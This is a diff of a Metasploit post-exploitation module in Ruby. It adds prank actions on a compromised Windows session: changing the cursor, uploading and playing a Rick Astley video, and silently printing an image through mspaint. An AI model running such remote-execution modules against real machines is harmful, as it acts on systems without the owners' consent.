@@ -26,8 +26,12 @@ class Metasploit3 < Msf::Post
 
 	def run
 		if datastore["COMMAND"].eql? "cursor"
-			#make_rick_astley_cursor
-			print_status("command was set to cursor")
+			make_rick_astley_cursor
+		elsif datastore["COMMAND"].eql? "video"
+			print_status("Launching Rick Roll Video")
+			launch_video
+		elsif datastore["COMMAND"].eql? "printer"
+			print_rick_to_default_printer
 		else
 			# do this by default for now
 			#make_rick_astley_cursor
@@ -85,35 +89,32 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
-	def launchIERickRoll
-	  session.sys.process.execute("iexplore.exe http://www.youtube.com/watch?v=oHg5SJYRHA0")
+	def launch_video
+		path = ::File.join(Msf::Config.install_root, "data", "post")
+		rick_video_filename = "rick.avi"
+		rick_avi = ::File.join(path, rick_video_filename)
+
+		print_status("Uploading video")
+		mediaplayer = "\"C:\\Program Files\\Windows Media Player\\wmplayer.exe\""
+		
+		tempdir = client.fs.file.expand_path("%TEMP%")
+		temp_video = tempdir + "\\" +  Rex::Text.rand_text_alpha((rand(8)+6)) + ".avi"
+		print_status "Uploading to => " + temp_video
+		session.fs.file.upload_file("#{temp_video}", rick_avi)
+
+		session.sys.process.execute("#{mediaplayer} \"#{temp_video}\"", nil, {'Hidden' => false})
 	end
 	
 	def print_rick_to_default_printer
-		# parse default printer at the following locations depending on OS ver
-		# # Windows XP
-		# cscript prnmngr.vbs -g
-		# # Windows 7
-		# #cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\prnmngr.vbs -g
-		# rundll32    shimgvw.dll    ImageView_PrintTo /pt   xxx.png   "Default printer name"
 		path = ::File.join(Msf::Config.install_root, "data", "post")
 		rick_picture_filename = "rick.png"
 		rick_png = ::File.join(path, rick_picture_filename)
 
-
-		# printer registry key 
-		keychunk = registry_getvaldata("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "Device")
-		default_printer = keychunk.split( /, */, 0 )[0]
-		print_status("default printer is:" + default_printer)	
-
-		# this only applies to windows xp		
 		tempdir = client.fs.file.expand_path("%TEMP%")
 		temp_picture = tempdir + "\\" +  Rex::Text.rand_text_alpha((rand(8)+6)) + ".png"
 		print_status "uploading to => " + temp_picture
 		session.fs.file.upload_file("#{temp_picture}", rick_png)
-		#session.sys.process.execute("rundll32 shimgvw.dll ImageView_PrintTo /pt \"#{temp_picture}\" \"#{default_printer}\"", nil, {'Hidden' => true})
-		drive = session.fs.file.expand_path("%SystemDrive%")
-		path = drive + '\\Program Files\\'
+
 		print_status("Printing rick out to the default printer")
 		session.sys.process.execute("cmd.exe /c mspaint.exe /pt \"#{temp_picture}\"", nil, {'Hidden' => true})
 	end
